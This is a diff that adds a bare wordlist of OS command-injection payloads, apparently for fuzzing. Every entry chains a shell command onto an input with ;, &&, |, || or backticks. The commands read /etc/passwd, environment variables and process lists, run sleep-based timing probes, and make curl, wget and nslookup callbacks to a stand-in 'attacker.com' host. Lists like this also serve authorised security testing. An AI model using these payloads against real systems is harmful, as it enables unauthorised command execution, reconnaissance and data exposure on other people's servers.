@@ -1,0 +1,115 @@
+;id
+;whoami
+&&id
+|id
+$(id)
+`id`
+;sleep 5
+$(sleep 5)
+;cat /etc/passwd
+;uname -a
+
+;id
+;whoami
+;uname -a
+;cat /etc/passwd
+;ls
+;pwd
+;id;
+;whoami;
+;uname -a;
+;cat /etc/passwd;
+;ls;
+;pwd;
+
+&&id
+&&whoami
+&&uname -a
+&&cat /etc/passwd
+&&ls
+&&pwd
+
+|id
+|whoami
+|uname -a
+|cat /etc/passwd
+|ls
+|pwd
+
+||id
+||whoami
+||uname -a
+||cat /etc/passwd
+||ls
+||pwd
+
+&id
+&whoami
+&uname -a
+&cat /etc/passwd
+&ls
+&pwd
+
+`id`
+`whoami`
+`uname -a`
+`cat /etc/passwd`
+`ls`
+`pwd`
+
+$(id)
+$(whoami)
+$(uname -a)
+$(cat /etc/passwd)
+$(ls)
+$(pwd)
+
+;ping -c 1 127.0.0.1
+&&ping -c 1 127.0.0.1
+|ping -c 1 127.0.0.1
+
+;sleep 5
+&&sleep 5
+|sleep 5
+$(sleep 5)
+`sleep 5`
+
+;curl http://attacker.com
+&&curl http://attacker.com
+|curl http://attacker.com
+
+;wget http://attacker.com
+&&wget http://attacker.com
+|wget http://attacker.com
+
+;nslookup attacker.com
+&&nslookup attacker.com
+|nslookup attacker.com
+
+;cat /etc/hosts
+&&cat /etc/hosts
+|cat /etc/hosts
+
+;ps aux
+&&ps aux
+|ps aux
+
+;env
+&&env
+|env
+
+;hostname
+&&hostname
+|hostname
+
+;uptime
+&&uptime
+|uptime
+
+;ls -la
+&&ls -la
+|ls -la
+
+;cat /proc/version
+&&cat /proc/version
+|cat /proc/version
